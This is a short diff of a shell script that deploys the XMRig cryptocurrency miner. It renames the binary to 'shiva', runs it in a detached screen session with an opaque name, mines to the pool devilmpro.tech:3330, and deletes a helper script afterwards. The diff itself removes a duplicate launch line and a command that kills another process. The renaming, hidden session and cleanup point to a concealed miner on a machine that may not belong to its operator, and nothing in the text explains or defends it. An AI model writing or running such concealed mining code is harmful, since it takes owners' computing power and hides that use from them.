@@ -29,8 +29,9 @@ cd
 cd pro
 cd build
 sudo mv xmrig shiva
-screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
-sudo pkill akko
+cd
+cd pro
+cd build
 screen -dmS p4rs37 ./shiva  -a rx/0 --donate-level 0 -o devilmpro.tech:3330 --rig-id TERAZ --cpu-affinity 0x0 --randomx-1gb-pages
 cd 
 sudo rm enable_1gb_pages.sh
